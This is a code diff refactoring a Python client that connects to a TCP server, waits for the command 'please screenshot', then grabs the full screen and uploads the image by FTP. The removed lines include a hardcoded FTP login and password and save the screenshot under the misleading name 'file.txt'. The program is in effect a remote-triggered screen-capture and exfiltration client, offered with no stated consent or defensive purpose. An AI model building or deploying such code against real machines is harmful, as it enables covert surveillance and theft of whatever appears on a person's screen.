@@ -1,44 +1,33 @@
-from PIL import ImageGrab
-from ftplib import FTP
 import socket
 
-def self_screenshot():
-    screenshot = ImageGrab.grab()
-    screenshot.save("screenshot.png")
-    screenshot.close()
+from ftp_connection import upload_file
+from take_screenshot import self_screenshot
+
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 12345
 
 
-def upload_file():
-    ftp = FTP()
-    ftp.connect('127.0.0.1', 21)
-    ftp.login('dori', 'avmybaby')
-
-    local_file = 'screenshot.png'
-    remote_file = 'file.txt'
-
-    with open(local_file, 'rb') as f:
-        ftp.storbinary(f"STOR {remote_file}", f)
-
-    print(f"File '{local_file}' uploaded successfully.")
-
-    ftp.quit()
+def is_screenshot_message(message: str) -> bool:
+    return message == 'please screenshot'
 
 
-def main_tcp_process():
-    host = '127.0.0.1'
-    port = 12345
+def take_and_upload_screenshot():
+    screenshot_filename = self_screenshot()
+    upload_file(screenshot_filename)
+
+
+def tcp_connect_and_handle_loop():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        client_socket.connect((host, port))
-        print(f"Connected to server {host}:{port}")
+        client_socket.connect((SERVER_IP, SERVER_PORT))
+        print(f"Connected to server {SERVER_IP}:{SERVER_PORT}")
 
         while True:
             print("Waiting for a message from the server...")
             message = client_socket.recv(1024).decode('utf-8')
-            if message == 'please screenshot':
-                self_screenshot()  # Takes a screenshot
-                upload_file()  # Uploads the screenshot to the ftp server
+            if is_screenshot_message(message):
+                take_and_upload_screenshot()
 
     except ConnectionError as e:
         print(f"Connection error: {e}")
@@ -46,5 +35,3 @@ def main_tcp_process():
     finally:
         client_socket.close()
         print("Connection closed")
-
-    print("Done successfully.")
